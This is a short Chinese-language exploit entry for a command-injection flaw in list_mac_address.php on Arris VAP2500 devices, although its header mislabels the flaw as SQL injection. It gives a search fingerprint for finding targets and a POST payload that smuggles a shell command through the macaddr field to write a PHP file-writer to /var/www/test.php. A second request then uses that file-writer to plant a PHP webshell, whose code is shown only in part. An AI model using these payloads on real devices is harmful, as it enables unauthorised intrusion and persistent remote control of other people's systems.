# ArrisVAP2500list_mac_address.php命令注入漏洞

- **系统**：ArrisVAP2500list　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="CACHE-CONTROL"`
- **请求**：`POST /list_mac_address.php HTTP/1.1`

**请求体 / payload**
```
写入一个具有文件写入功能的功能小马：
Host: your-ip
Content-Type: application/x-www-form-urlencoded
macaddr=00%3A00%3A44%3A00%3A00%3A00%3Becho+%27%3C%3Fphp+file_put_contents%28%24_POST%5B%22filename%22%5D%2C+%24_POST%5B%22content%22%5D%29%3F%3E%27%3E+%2Fvar%2Fwww%2Ftest.php&action=0&settype=1
利用此小马写入webshell:
POST /test.php HTTP/1.1
Host: your-ip
Content-Type: application/x-www-form-urlencoded
filename=shell.php&content=%3C%3Fphp+%40session_start%28%29%3B+%40set_time_limit%280%29%3B+%40error_reporting%280%29%3B+function+encode%28%24D%2C%24K%29%7B+for%28%24i%3D0%3B%24i%3Cstrlen%28%24D%29%3B%24i%2B%2B%29+%7B+%24c+…（脚本共 1549 字，完整版见原文）
```
- **预期**：200　|　—